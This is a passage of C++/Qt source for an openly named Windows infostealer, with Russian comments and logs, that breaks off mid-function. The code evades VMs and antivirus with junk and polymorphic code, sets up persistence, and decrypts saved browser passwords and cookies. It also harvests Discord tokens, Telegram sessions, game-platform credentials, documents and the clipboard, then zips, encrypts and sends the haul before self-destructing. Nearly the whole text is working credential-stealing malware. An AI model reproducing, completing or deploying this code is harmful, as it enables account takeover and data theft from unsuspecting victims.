    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonObject json = QJsonDocument::fromJson(reply->readAll()).object();
            QString status = json["status"].toString();
            QString conclusion = json["conclusion"].toString();
            emitLog("Статус сборки GitHub Actions: " + status + " (Conclusion: " + conclusion + ")");
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emitLog("Сборка успешно завершена через GitHub Actions");
                    emit startStealSignal();
                } else {
                    emitLog("Сборка завершилась с ошибкой");
                    isBuilding = false;
                }
            }
        } else {
            emitLog("Ошибка проверки статуса GitHub Actions: " + reply->errorString());
            statusCheckTimer->stop();
            isBuilding = false;
        }
        reply->deleteLater();
    });
}

// Запуск процесса кражи данных
void MainWindow::startStealProcess() {
    if (AntiAnalysis()) {
        emitLog("Обнаружена виртуальная машина или антивирус. Завершение работы.");
        FakeError();
        exitApp();
        return;
    }
    if (config.fakeError) FakeError();
    if (config.silent) Stealth();
    if (config.autoStart || config.persist) Persist();

    std::string tempDir = std::string(std::getenv("TEMP")) + "\\DeadCode_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(tempDir));
    emitLog("Создана временная директория: " + QString::fromStdString(tempDir));

    QThread* thread = new QThread;
    StealerWorker* worker = new StealerWorker(this, tempDir);
    worker->moveToThread(thread);

    connect(thread, &QThread::started, worker, &StealerWorker::process);
    connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
}

// Основной метод кражи и отправки данных
void MainWindow::StealAndSendData(const std::string& tempDir) {
    emitLog("Начинается процесс кражи данных...");

    JunkCode::executeJunkCode();
    emitLog("Выполнен мусорный код перед началом кражи данных");

    Polymorphic::executePolymorphicCode();
    emitLog("Выполнен полиморфный код перед началом кражи данных");

    if (config.screenshot) takeScreenshot(tempDir);
    if (config.systemInfo) collectSystemInfo(tempDir);
    if (config.cookies || config.passwords) stealBrowserData(tempDir);
    if (config.discord || config.chatHistory) stealDiscordData(tempDir);
    if (config.telegram || config.chatHistory) stealTelegramData(tempDir);
    if (config.steam || config.steamMAFile) stealSteamData(tempDir);
    if (config.epic) stealEpicData(tempDir);
    if (config.roblox) stealRobloxData(tempDir);
    if (config.battlenet) stealBattleNetData(tempDir);
    if (config.minecraft) stealMinecraftData(tempDir);
    if (config.fileGrabber) stealFiles(tempDir);
    if (config.socialEngineering) collectSocialEngineeringData(tempDir);
    if (config.chatHistory) stealChatHistory(tempDir);

    std::string archivePath = tempDir + "\\stolen_data.zip";
    archiveData(tempDir, archivePath);

    std::string encryptedPath = tempDir + "\\stolen_data_encrypted.zip";
    encryptData(archivePath, encryptedPath);

    std::vector<std::string> filesToSend;
    filesToSend.push_back(encryptedPath);
    for (const auto& screenshot : screenshotsPaths) {
        filesToSend.push_back(screenshot);
    }

    sendData(QString::fromStdString(encryptedPath), filesToSend);

    try {
        std::filesystem::remove_all(tempDir);
        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
    } catch (const std::exception& e) {
        emitLog("Ошибка удаления временной директории: " + QString::fromStdString(e.what()));
    }

    if (config.selfDestruct) {
        SelfDestruct();
    }

    emitLog("Процесс кражи данных завершен");
}

// Снятие скриншота
void MainWindow::takeScreenshot(const std::string& dir) {
    QScreen *screen = QGuiApplication::primaryScreen();
    if (screen) {
        QPixmap screenshot = screen->grabWindow(0);
        std::string path = dir + "\\screenshot_" + std::to_string(GetTickCount()) + ".png";
        if (screenshot.save(QString::fromStdString(path), "PNG")) {
            screenshotsPaths.push_back(path);
            emitLog("Скриншот сохранен: " + QString::fromStdString(path));
        } else {
            emitLog("Ошибка: Не удалось сохранить скриншот");
        }
    } else {
        emitLog("Ошибка: Не удалось сделать скриншот");
    }
}

// Сбор системной информации
void MainWindow::collectSystemInfo(const std::string& dir) {
    QString systemInfo = "System Information:\n";
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameW(computerName, &size)) {
        systemInfo += "Computer Name: " + QString::fromWCharArray(computerName) + "\n";
    }

    wchar_t userName[UNLEN + 1];
    size = sizeof(userName) / sizeof(userName[0]);
    if (GetUserNameW(userName, &size)) {
        systemInfo += "Username: " + QString::fromWCharArray(userName) + "\n";
    }

    systemInfo += "OS: " + QSysInfo::prettyProductName() + "\n";
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    if (!hostInfo.addresses().isEmpty()) {
        systemInfo += "IP: " + hostInfo.addresses().first().toString() + "\n";
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    systemInfo += "Processor Architecture: " + QString::number(si.wProcessorArchitecture) + "\n";
    systemInfo += "Number of Processors: " + QString::number(si.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        systemInfo += "Total Physical Memory: " + QString::number(memoryStatus.ullTotalPhys / (1024 * 1024)) + " MB\n";
    }

    std::string path = dir + "\\system_info.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << systemInfo;
        file.close();
        emitLog("Системная информация сохранена: " + QString::fromStdString(path));
    } else {
        emitLog("Ошибка: Не удалось сохранить системную информацию");
    }
}

// Кража данных браузеров
void MainWindow::stealBrowserData(const std::string& dir) {
    emitLog("Кража данных браузеров...");

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::pair<std::string, std::string>> browsers = {
        {"Chrome", std::string(appDataPath) + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", std::string(appDataPath) + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", std::string(appDataPath) + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", std::string(appDataPath) + "\\Opera Software\\Opera GX Stable\\"},
        {"Vivaldi", std::string(appDataPath) + "\\Vivaldi\\User Data\\Default\\"},
        {"Yandex", std::string(appDataPath) + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browsers) {
        if (config.passwords) {
            std::string loginDataPath = browser.second + "Login Data";
            if (std::filesystem::exists(loginDataPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_LoginData_temp";
                try {
                    std::filesystem::copy_file(loginDataPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных паролей %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_passwords.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* password = sqlite3_column_blob(stmt, 2);
                                int passwordLen = sqlite3_column_bytes(stmt, 2);

                                out << "URL: " << (url ? QString::fromUtf8(url) : "N/A") << "\n";
                                out << "Username: " << (username ? QString::fromUtf8(username) : "N/A") << "\n";
                                if (password && passwordLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)passwordLen, (BYTE*)password};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Password: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Password: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать пароль для %1").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Password: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Пароли %1 сохранены: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для паролей %1").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для паролей %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных паролей %1 не найдена").arg(QString::fromStdString(browser.first)));
            }
        }
        if (config.cookies) {
            std::string cookiesPath = browser.second + "Network\\Cookies";
            if (std::filesystem::exists(cookiesPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_Cookies_temp";
                try {
                    std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                } catch (const std::exception& e) {
                    emitLog(QString("Ошибка копирования базы данных куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(e.what())));
                    continue;
                }

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_cookies.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* value = sqlite3_column_blob(stmt, 2);
                                int valueLen = sqlite3_column_bytes(stmt, 2);

                                out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                if (value && valueLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)valueLen, (BYTE*)value};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Value: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Value: [Failed to decrypt]\n";
                                        emitLog(QString("Не удалось расшифровать куки для %1").arg(QString::fromStdString(browser.first)));
                                    }
                                } else {
                                    out << "Value: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emitLog(QString("Куки %1 сохранены: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        } else {
                            emitLog(QString("Ошибка: Не удалось создать файл для куки %1").arg(QString::fromStdString(browser.first)));
                        }
                        sqlite3_finalize(stmt);
                    } else {
                        emitLog(QString("Ошибка подготовки SQL-запроса для куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                } else {
                    emitLog(QString("Ошибка открытия базы данных куки %1: %2").arg(QString::fromStdString(browser.first), QString::fromStdString(sqlite3_errmsg(db))));
                }
            } else {
                emitLog(QString("База данных куки %1 не найдена").arg(QString::fromStdString(browser.first)));
            }
        }
    }

    // Поддержка Firefox
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string firefoxPath = std::string(appDataPath) + "\\Mozilla\\Firefox\\Profiles\\";
    if (std::filesystem::exists(firefoxPath)) {
        for (const auto& entry : std::filesystem::directory_iterator(firefoxPath)) {
            std::string profilePath = entry.path().string();
            if (config.passwords) {
                std::string loginsPath = profilePath + "\\logins.json";
                if (std::filesystem::exists(loginsPath)) {
                    std::string path = dir + "\\Firefox_logins.json";
                    if (QFile::copy(QString::fromStdString(loginsPath), QString::fromStdString(path))) {
                        emitLog("Пароли Firefox сохранены: " + QString::fromStdString(path));
                    } else {
                        emitLog("Ошибка: Не удалось скопировать пароли Firefox");
                    }
                } else {
                    emitLog("Файл logins.json для Firefox не найден");
                }
            }
            if (config.cookies) {
                std::string cookiesPath = profilePath + "\\cookies.sqlite";
                if (std::filesystem::exists(cookiesPath)) {
                    std::string tempPath = dir + "\\Firefox_Cookies_temp";
                    try {
                        std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);
                    } catch (const std::exception& e) {
                        emitLog("Ошибка копирования базы данных куки Firefox: " + QString::fromStdString(e.what()));
                        continue;
                    }

                    sqlite3 *db;
                    if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                        sqlite3_stmt *stmt;
                        if (sqlite3_prepare_v2(db, "SELECT host, name, value FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                            std::string path = dir + "\\Firefox_cookies.txt";
                            QFile file(QString::fromStdString(path));
                            if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                                QTextStream out(&file);
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                    const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                    const char* value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));

                                    out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                    out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                    out << "Value: " << (value ? QString::fromUtf8(value) : "N/A") << "\n\n";
                                }
                                file.close();
                                emitLog("Куки Firefox сохранены: " + QString::fromStdString(path));
                            } else {
                                emitLog("Ошибка: Не удалось создать файл для куки Firefox");
                            }
                            sqlite3_finalize(stmt);
                        } else {
                            emitLog("Ошибка подготовки SQL-запроса для куки Firefox: " + QString::fromStdString(sqlite3_errmsg(db)));
                        }
                        sqlite3_close(db);
                        std::filesystem::remove(tempPath);
                    } else {
                        emitLog("Ошибка открытия базы данных куки Firefox: " + QString::fromStdString(sqlite3_errmsg(db)));
                    }
                } else {
                    emitLog("База данных куки Firefox не найдена");
                }
            }
        }
    } else {
        emitLog("Профили Firefox не найдены");
    }

    emitLog("Кража данных браузеров завершена");
}

// Кража данных Discord
void MainWindow::stealDiscordData(const std::string& dir) {
    emitLog("Кража данных Discord...");

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
    if (std::filesystem::exists(discordPath)) {
        std::string tokenPath = dir + "\\discord_tokens.txt";
        QFile file(QString::fromStdString(tokenPath));
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream out(&file);
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb") {
                    std::ifstream ldbFile(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
                    ldbFile.close();

                    QRegularExpression tokenRegex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                    QRegularExpressionMatchIterator i = tokenRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << match.captured() << "\n";
                    }
                }
            }
            file.close();
            if (file.size() > 0) {
                emitLog("Токены Discord сохранены: " + QString::fromStdString(tokenPath));
            } else {
                emitLog("Токены Discord не найдены");
                std::filesystem::remove(tokenPath);
            }
        } else {
            emitLog("Ошибка: Не удалось создать файл для токенов Discord");
        }
    } else {
        emitLog("Папка Discord не найдена");
    }

    emitLog("Кража данных Discord завершена");
}

// Кража данных Telegram
void MainWindow::stealTelegramData(const std::string& dir) {
    emitLog("Кража данных Telegram...");

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string telegramPath = std::string(appDataPath) + "\\Telegram Desktop\\tdata\\";
    if (std::filesystem::exists(telegramPath)) {
        std::string destDir = dir + "\\Telegram";
        try {
            std::filesystem::create_directory(destDir);
            for (const auto& entry : std::filesystem::directory_iterator(telegramPath)) {
                if (entry.path().filename().string().find("user_data") == std::string::npos &&
                    entry.path().filename().string().find("key_data") != std::string::npos) {
                    std::filesystem::copy(entry.path(), destDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                }
            }
            emitLog("Данные Telegram скопированы: " + QString::fromStdString(destDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Telegram: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Папка Telegram не найдена");
    }

    emitLog("Кража данных Telegram завершена");
}

// Кража данных Steam
void MainWindow::stealSteamData(const std::string& dir) {
    emitLog("Кража данных Steam...");

    std::string steamPath;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Valve\\Steam", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[MAX_PATH];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "InstallPath", nullptr, nullptr, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            steamPath = std::string(buffer);
        }
        RegCloseKey(hKey);
    }

    if (!steamPath.empty()) {
        std::string configPath = steamPath + "\\config\\";
        std::string ssfnPath = steamPath + "\\";
        std::string destDir = dir + "\\Steam";
        try {
            std::filesystem::create_directory(destDir);
            if (std::filesystem::exists(configPath)) {
                std::filesystem::copy(configPath, destDir + "\\config", std::filesystem::copy_options::recursive);
                emitLog("Конфигурационные файлы Steam скопированы: " + QString::fromStdString(destDir + "\\config"));
            }
            if (config.steamMAFile) {
                for (const auto& entry : std::filesystem::directory_iterator(ssfnPath)) {
                    if (entry.path().filename().string().find("ssfn") != std::string::npos) {
                        std::filesystem::copy_file(entry.path(), destDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                        emitLog("SSFN файл скопирован: " + QString::fromStdString(entry.path().filename().string()));
                    }
                }
            }
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Steam: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Папка Steam не найдена");
    }

    emitLog("Кража данных Steam завершена");
}

// Кража данных Epic Games
void MainWindow::stealEpicData(const std::string& dir) {
    emitLog("Кража данных Epic Games...");

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string epicPath = std::string(appDataPath) + "\\EpicGamesLauncher\\Saved\\";
    if (std::filesystem::exists(epicPath)) {
        std::string destDir = dir + "\\EpicGames";
        try {
            std::filesystem::create_directory(destDir);
            std::filesystem::copy(epicPath, destDir, std::filesystem::copy_options::recursive);
            emitLog("Данные Epic Games скопированы: " + QString::fromStdString(destDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Epic Games: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Папка Epic Games не найдена");
    }

    emitLog("Кража данных Epic Games завершена");
}

// Кража данных Roblox
void MainWindow::stealRobloxData(const std::string& dir) {
    emitLog("Кража данных Roblox...");

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::string robloxPath = std::string(appDataPath) + "\\Roblox\\";
    if (std::filesystem::exists(robloxPath)) {
        std::string destDir = dir + "\\Roblox";
        try {
            std::filesystem::create_directory(destDir);
            std::filesystem::copy(robloxPath, destDir, std::filesystem::copy_options::recursive);
            emitLog("Данные Roblox скопированы: " + QString::fromStdString(destDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Roblox: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Папка Roblox не найдена");
    }

    emitLog("Кража данных Roblox завершена");
}

// Кража данных Battle.net
void MainWindow::stealBattleNetData(const std::string& dir) {
    emitLog("Кража данных Battle.net...");

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string battlenetPath = std::string(appDataPath) + "\\Battle.net\\";
    if (std::filesystem::exists(battlenetPath)) {
        std::string destDir = dir + "\\BattleNet";
        try {
            std::filesystem::create_directory(destDir);
            std::filesystem::copy(battlenetPath, destDir, std::filesystem::copy_options::recursive);
            emitLog("Данные Battle.net скопированы: " + QString::fromStdString(destDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Battle.net: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Папка Battle.net не найдена");
    }

    emitLog("Кража данных Battle.net завершена");
}

// Кража данных Minecraft
void MainWindow::stealMinecraftData(const std::string& dir) {
    emitLog("Кража данных Minecraft...");

    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string minecraftPath = std::string(appDataPath) + "\\.minecraft\\";
    if (std::filesystem::exists(minecraftPath)) {
        std::string destDir = dir + "\\Minecraft";
        try {
            std::filesystem::create_directory(destDir);
            for (const auto& entry : std::filesystem::directory_iterator(minecraftPath)) {
                if (entry.path().filename() == "launcher_profiles.json" ||
                    entry.path().filename() == "usercache.json" ||
                    entry.path().filename() == "options.txt") {
                    std::filesystem::copy_file(entry.path(), destDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                }
            }
            emitLog("Данные Minecraft скопированы: " + QString::fromStdString(destDir));
        } catch (const std::exception& e) {
            emitLog("Ошибка копирования данных Minecraft: " + QString::fromStdString(e.what()));
        }
    } else {
        emitLog("Папка Minecraft не найдена");
    }

    emitLog("Кража данных Minecraft завершена");
}

// Кража истории чатов
void MainWindow::stealChatHistory(const std::string& dir) {
    emitLog("Кража истории чатов...");

    // Пример для Discord (уже частично реализовано в stealDiscordData)
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string discordPath = std::string(appDataPath) + "\\discord\\Local Storage\\leveldb\\";
    if (std::filesystem::exists(discordPath)) {
        std::string chatPath = dir + "\\discord_chat_history.txt";
        QFile file(QString::fromStdString(chatPath));
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream out(&file);
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb") {
                    std::ifstream ldbFile(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(ldbFile)), std::istreambuf_iterator<char>());
                    ldbFile.close();

                    QRegularExpression messageRegex("\"content\":\"[^\"]+\"");
                    QRegularExpressionMatchIterator i = messageRegex.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        QRegularExpressionMatch match = i.next();
                        out << match.captured() << "\n";
                    }
                }
            }
            file.close();
            if (file.size() > 0) {
                emitLog("История чатов Discord сохранена: " + QString::fromStdString(chatPath));
            } else {
                emitLog("История чатов Discord не найдена");
                std::filesystem::remove(chatPath);
            }
        } else {
            emitLog("Ошибка: Не удалось создать файл для истории чатов Discord");
        }
    } else {
        emitLog("Папка Discord для истории чатов не найдена");
    }

    emitLog("Кража истории чатов завершена");
}

// Кража файлов (граббер)
void MainWindow::stealFiles(const std::string& dir) {
    emitLog("Кража файлов (граббер)...");

    std::vector<std::string> targetDirs = {
        std::string(getenv("USERPROFILE")) + "\\Desktop\\",
        std::string(getenv("USERPROFILE")) + "\\Documents\\",
        std::string(getenv("USERPROFILE")) + "\\Downloads\\"
    };
    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".pdf", ".jpg", ".png"};

    std::string destDir = dir + "\\GrabbedFiles";
    try {
        std::filesystem::create_directory(destDir);
        int fileCount = 0;
        for (const auto& targetDir : targetDirs) {
            if (std::filesystem::exists(targetDir)) {
                for (const auto& entry : std::filesystem::recursive_directory_iterator(targetDir)) {
                    if (entry.is_regular_file()) {
                        std::string ext = entry.path().extension().string();
                        if (std::find(extensions.begin(), extensions.end(), ext) != extensions.end()) {
                            if (fileCount >= 50) break; // Ограничение на количество файлов
                            std::filesystem::copy_file(entry.path(), destDir + "\\" + entry.path().filename().string(), std::filesystem::copy_options::overwrite_existing);
                            fileCount++;
                        }
                    }
                }
            }
        }
        emitLog(QString("Скопировано %1 файлов: %2").arg(fileCount).arg(QString::fromStdString(destDir)));
    } catch (const std::exception& e) {
        emitLog("Ошибка копирования файлов: " + QString::fromStdString(e.what()));
    }

    emitLog("Кража файлов завершена");
}

// Сбор данных для социальной инженерии
void MainWindow::collectSocialEngineeringData(const std::string& dir) {
    emitLog("Сбор данных для социальной инженерии...");

    QString socialData = "Social Engineering Data:\n";

    // Данные буфера обмена
    QClipboard *clipboard = QGuiApplication::clipboard();
    if (clipboard) {
        QString clipboardText = clipboard->text();
        if (!clipboardText.isEmpty()) {
            socialData += "Clipboard: " + clipboardText + "\n";
        } else {
            socialData += "Clipboard: [Empty]\n";
        }
    } else {
        socialData += "Clipboard: [Not accessible]\n";
    }

    // Недавно открытые файлы
    char recentPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, 0, recentPath) == S_OK) {
        std::string recentFilesPath = std::string(recentPath);
        if (std::filesystem::exists(recentFilesPath)) {
            socialData += "Recent Files:\n";
            int fileCount = 0;
            for (const auto& entry : std::filesystem::directory_iterator(recentFilesPath)) {
                if (fileCount >= 10) break; // Ограничим до 10 файлов
                if (entry.is_regular_file()) {
                    socialData += QString::fromStdString(entry.path().filename().string()) + "\n";
                    fileCount++;
                }
            }
            if (fileCount == 0) {
                socialData += "[No recent files found]\n";
            }
        } else {
            socialData += "Recent Files: [Directory not found]\n";
        }
    } else {
        socialData += "Recent Files: [Unable to access directory]\n";
    }

    // Сохранение данных
    std::string path = dir + "\\social_engineering.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << socialData;
        file.close();
        emitLog("Данные для социальной инженерии сохранены: " + QString::fromStdString(path));
    } else {
        emitLog("Ошибка: Не удалось сохранить данные для социальной инженерии");
    }

    emitLog("Сбор данных для социальной инженерии завершен");
}

// Архивирование данных
void MainWindow::archiveData(const std::string& dir, const std::string& archivePath) {
    emitLog("Архивирование данных в " + QString::fromStdString(archivePath) + "...");

    int err = 0;
    zip_t* zip = zip_open(archivePath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        emitLog("Ошибка: Не удалось создать архив: " + QString::number(err));
        return;
    }

    for (const auto& entry : std::filesystem::recursive_directory_iterator(dir)) {
        if (entry.is_regular_file()) {
            std::string filePath = entry.path().string();
            std::string relativePath = std::filesystem::relative(filePath, dir).string();

            zip_source_t* source = zip_source_file(zip, filePath.c_str(), 0, 0);
            if (!source) {
                emitLog("Ошибка: Не удалось создать источник для файла: " + QString::fromStdString(filePath));
                continue;
            }

            if (zip_file_add(zip, relativePath.c_str(), source, ZIP_FL_OVERWRITE) < 0) {
                emitLog("Ошибка: Не удалось добавить файл в архив: " + QString::fromStdString(filePath));
                zip_source_free(source);
                continue;
            }
        }
    }

    if (zip_close(zip) < 0) {
        emitLog("Ошибка: Не удалось закрыть архив: " + QString::fromStdString(zip_error_strerror(zip_get_error(zip))));
        return;
    }

    emitLog("Данные успешно заархивированы: " + QString::fromStdString(archivePath));
}

// Шифрование данных
void MainWindow::encryptData(const std::string& inputPath, const std::string& outputPath) {
    emitLog("Шифрование данных...");

    std::ifstream inFile(inputPath, std::ios::binary);
    if (!inFile) {
        emitLog("Ошибка: Не удалось открыть файл для шифрования: " + QString::fromStdString(inputPath));
        return;
    }

    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile) {
        emitLog("Ошибка: Не удалось создать файл для зашифрованных данных: " + QString::fromStdString(outputPath));
        inFile.close();
        return;
    }

    auto key = GetEncryptionKey(true);
    auto iv = generateIV();

    // Запись IV в начало файла
    outFile.write((char*)iv.data(), iv.size());

    // Чтение файла в QByteArray
    inFile.seekg(0, std::ios::end);
    size_t size = inFile.tellg();
    inFile.seekg(0, std::ios::beg);
    QByteArray data(size, 0);
    inFile.read(data.data(), size);
    inFile.close();

    // Применение XOR
    data = applyXOR(data, key);

    // Применение AES
    QByteArray encryptedData = applyAES(data, key, iv);
    if (encryptedData.isEmpty()) {
        emitLog("Ошибка: Не удалось зашифровать данные");
        outFile.close();
        return;
    }

    // Запись зашифрованных данных
    outFile.write(encryptedData.data(), encryptedData.size());
    outFile.close();

    emitLog("Данные успешно зашифрованы: " + QString::fromStdString(outputPath));
}

// Дешифрование данных
void MainWindow::decryptData(const std::string& inputPath, const std::string& outputPath) {
    emitLog("Дешифрование данных...");

    std::ifstream inFile(inputPath, std::ios::binary);
    if (!inFile) {
        emitLog("Ошибка: Не удалось открыть файл для дешифрования: " + QString::fromStdString(inputPath));
        return;
    }

    std::ofstream outFile(outputPath, std::ios::binary);
    if (!outFile) {
        emitLog("Ошибка: Не удалось создать файл для расшифрованных данных: " + QString::fromStdString(outputPath));
        inFile.close();
        return;
    }

    // Чтение IV
    std::array<unsigned char, 16> iv;
    inFile.read((char*)iv.data(), iv.size());

    // Чтение зашифрованных данных
